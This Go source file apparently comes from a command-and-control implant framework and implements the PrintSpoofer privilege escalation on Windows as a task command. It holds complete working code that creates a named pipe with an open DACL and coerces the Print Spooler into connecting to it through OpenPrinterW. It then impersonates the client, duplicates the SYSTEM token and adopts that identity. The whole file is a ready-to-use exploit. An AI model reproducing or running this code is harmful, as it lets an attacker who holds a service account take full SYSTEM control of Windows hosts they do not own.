//go:build windows
// +build windows

package commands

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PrintSpooferCommand implements the PrintSpoofer privilege escalation technique.
// Exploits SeImpersonatePrivilege by creating a named pipe and triggering the
// Print Spooler service (SYSTEM) to connect to it, then impersonating the token.
// Works from NETWORK SERVICE, LOCAL SERVICE, or any context with SeImpersonate.
type PrintSpooferCommand struct{}

func (c *PrintSpooferCommand) Name() string { return "printspoofer" }
func (c *PrintSpooferCommand) Description() string {
	return "PrintSpoofer privilege escalation — SeImpersonate to SYSTEM via Print Spooler"
}

type printSpooferArgs struct {
	Timeout int `json:"timeout"`
}

var (
	winspoolDrv      = windows.NewLazySystemDLL("winspool.drv")
	procOpenPrinterW = winspoolDrv.NewProc("OpenPrinterW")
	procClosePrinter = winspoolDrv.NewProc("ClosePrinter")
)

func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[printSpooferArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	if args.Timeout == 0 {
		args.Timeout = 30
	}

	if !checkPrivilege("SeImpersonatePrivilege") {
		return errorResult("SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).")
	}

	oldIdentity, _ := GetCurrentIdentity()
	hostnames, err := spooferHostnames()
	if err != nil {
		return errorf("%v", err)
	}

	var randBuf [4]byte
	_, _ = rand.Read(randBuf[:])
	pipeSuffix := hex.EncodeToString(randBuf[:])
	pipePath := fmt.Sprintf(`\\.\pipe\%s\pipe\spoolss`, pipeSuffix)

	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return errorf("NewSecurityDescriptor failed: %v", sdErr)
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return errorf("SetDACL failed: %v", err)
	}
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}
	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
	if err != nil {
		return errorf("UTF16 conversion failed: %v", err)
	}

	spooferFireTriggers(hostnames, pipeSuffix, time.Duration(args.Timeout)*time.Second)

	result, warnings := spooferAcceptSystem(pipeNamePtr, &sa, time.Duration(args.Timeout)*time.Second)
	if result.token == 0 {
		return spooferTimeoutResult(args.Timeout, pipePath, result.attempts, warnings)
	}

	if setErr := SetIdentityToken(result.token); setErr != nil {
		runtime.UnlockOSThread()
		windows.CloseHandle(windows.Handle(result.token))
		return errorf("Spooler connected as %s but SetIdentityToken failed: %v", result.identity, setErr)
	}
	osThreadLocked = true
	RecordIdentityTransition("printspoofer", oldIdentity, result.identity,
		fmt.Sprintf("pipe=%s", pipePath))

	var sb strings.Builder
	sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
	sb.WriteString(fmt.Sprintf("Hostnames tried: %v\n", hostnames))
	sb.WriteString(fmt.Sprintf("Captured identity: %s\n", result.identity))
	sb.WriteString(fmt.Sprintf("Attempts: %d\n", result.attempts))
	sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", result.identity))
	if len(warnings) > 0 {
		sb.WriteString("\nDiagnostics:\n")
		for _, w := range warnings {
			sb.WriteString(fmt.Sprintf("  %s\n", w))
		}
	}
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
	sb.WriteString("Use 'whoami' to verify current context.\n")
	return successResult(sb.String())
}

func spooferHostnames() ([]string, error) {
	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
	compNameSize := uint32(len(compNameBuf))
	if err := windows.GetComputerName(&compNameBuf[0], &compNameSize); err != nil {
		return nil, fmt.Errorf("GetComputerName failed: %v", err)
	}
	computerName := windows.UTF16ToString(compNameBuf[:compNameSize])

	hostnames := []string{computerName}
	var dnsNameBuf [256]uint16
	dnsNameSize := uint32(len(dnsNameBuf))
	if windows.GetComputerNameEx(windows.ComputerNameDnsFullyQualified, &dnsNameBuf[0], &dnsNameSize) == nil {
		dnsHostname := windows.UTF16ToString(dnsNameBuf[:dnsNameSize])
		if dnsHostname != "" && dnsHostname != computerName {
			hostnames = append(hostnames, dnsHostname)
		}
	}
	hostnames = append(hostnames, "127.0.0.1")
	return hostnames, nil
}

func spooferFireTriggers(hostnames []string, pipeSuffix string, timeout time.Duration) {
	for _, host := range hostnames {
		printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
		triggerDone := make(chan error, 1)
		go func(name string) {
			triggerDone <- triggerSpooler(name)
		}(printerName)
		go func(done chan error) {
			select {
			case <-done:
			case <-time.After(timeout):
			}
		}(triggerDone)
	}
}

type spooferCaptureResult struct {
	token    windows.Token
	identity string
	attempts int
}

func spooferAcceptSystem(pipeNamePtr *uint16, sa *windows.SecurityAttributes, timeout time.Duration) (spooferCaptureResult, []string) {
	deadline := time.Now().Add(timeout)
	var warnings []string
	result := spooferCaptureResult{}

	for time.Now().Before(deadline) {
		result.attempts++
		remaining := time.Until(deadline)
		if remaining <= 0 {
			break
		}

		hPipe, _, createErr := procCreateNamedPipeW.Call(
			uintptr(unsafe.Pointer(pipeNamePtr)),
			PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE,
			0, uintptr(unsafe.Pointer(sa)),
		)
		if hPipe == uintptr(windows.InvalidHandle) {
			warnings = append(warnings, fmt.Sprintf("attempt %d: CreateNamedPipe: %v", result.attempts, createErr))
			break
		}
		pipeHandle := windows.Handle(hPipe)
		event, eventErr := windows.CreateEvent(nil, 1, 0, nil)
		if eventErr != nil {
			windows.CloseHandle(pipeHandle)
			break
		}
		var overlapped windows.Overlapped
		overlapped.HEvent = event

		ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
		if ret == 0 && connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			warnings = append(warnings, fmt.Sprintf("attempt %d: ConnectNamedPipe: %v", result.attempts, connectErr))
			break
		}

		connected := connectErr == windows.ERROR_PIPE_CONNECTED
		if !connected {
			waitMs := uint32(remaining.Milliseconds())
			if waitMs > 5000 {
				waitMs = 5000
			}
			if wr, _ := windows.WaitForSingleObject(event, waitMs); wr == windows.WAIT_OBJECT_0 {
				connected = true
			}
		}
		if !connected {
			windows.CancelIoEx(pipeHandle, &overlapped)
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			continue
		}

		token, identity, warn := spooferTryCapture(hPipe, result.attempts)
		windows.CloseHandle(event)
		windows.CloseHandle(pipeHandle)
		if warn != "" {
			warnings = append(warnings, warn)
		}
		if token != 0 {
			result.token = token
			result.identity = identity
			return result, warnings
		}
	}
	return result, warnings
}

func spooferTryCapture(hPipe uintptr, attempt int) (windows.Token, string, string) {
	runtime.LockOSThread()
	impRet, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
	if impRet == 0 {
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return 0, "", fmt.Sprintf("attempt %d: ImpersonateNamedPipeClient failed: %v", attempt, impErr)
	}

	identity, _ := GetCurrentIdentity()
	if identity == "" {
		identity = "unknown"
	}
	if !strings.Contains(strings.ToUpper(identity), "SYSTEM") {
		procRevertToSelf.Call()
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return 0, "", fmt.Sprintf("attempt %d: connected as %s (not SYSTEM), retrying", attempt, identity)
	}

	var threadToken windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
	}
	if err != nil {
		procRevertToSelf.Call()
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return 0, identity, fmt.Sprintf("attempt %d: token capture failed: %v", attempt, err)
	}

	var dupToken windows.Token
	err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
		windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
	if err != nil {
		err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
			windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
	}
	threadToken.Close()
	procRevertToSelf.Call()
	procDisconnectNamedPipe.Call(hPipe)

	if err != nil {
		runtime.UnlockOSThread()
		return 0, identity, fmt.Sprintf("attempt %d: DuplicateTokenEx failed: %v", attempt, err)
	}
	return dupToken, identity, ""
}

func spooferTimeoutResult(timeout int, pipePath string, attempts int, warnings []string) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Timeout after %ds — Print Spooler did not connect as SYSTEM to %s.\n", timeout, pipePath))
	sb.WriteString(fmt.Sprintf("Attempts: %d\n", attempts))
	sb.WriteString("Possible causes:\n")
	sb.WriteString("- Print Spooler not running (sc query spooler)\n")
	sb.WriteString("- Technique may be patched on this Windows build\n")
	sb.WriteString("- SMB loopback connections may be blocked\n")
	if len(warnings) > 0 {
		sb.WriteString("\nDiagnostics:\n")
		for _, w := range warnings {
			sb.WriteString(fmt.Sprintf("  %s\n", w))
		}
	}
	return errorResult(sb.String())
}

// triggerSpooler calls OpenPrinterW with a crafted path that causes the
// Print Spooler service to connect to our named pipe as SYSTEM.
// OpenPrinterW errors are returned as diagnostics but are non-fatal —
// the spooler may have already connected to the pipe before returning.
func triggerSpooler(printerName string) error {
	namePtr, err := windows.UTF16PtrFromString(printerName)
	if err != nil {
		return fmt.Errorf("UTF16 conversion: %w", err)
	}

	var hPrinter uintptr
	ret, _, callErr := procOpenPrinterW.Call(
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(&hPrinter)),
		0, // pDefault = NULL
	)

	// OpenPrinterW may fail with an error (the printer doesn't actually exist),
	// but the important thing is that the spooler TRIED to connect to the pipe.
	// The authentication/connection happens before the error is returned.
	if ret != 0 && hPrinter != 0 {
		procClosePrinter.Call(hPrinter)
	}

	// Return OpenPrinterW errors as diagnostics (caller treats as non-fatal).
	// Expected errors:
	//   1801 = ERROR_INVALID_PRINTER_NAME (printer doesn't exist — expected)
	//   1210 = ERROR_INVALID_COMPUTERNAME (hostname format rejected)
	//   53   = ERROR_BAD_NETPATH (path resolution failed)
	// In all cases the spooler may still have connected to our pipe.
	if ret == 0 && callErr != nil {
		return fmt.Errorf("OpenPrinterW(%s): %w", printerName, callErr)
	}

	return nil
}
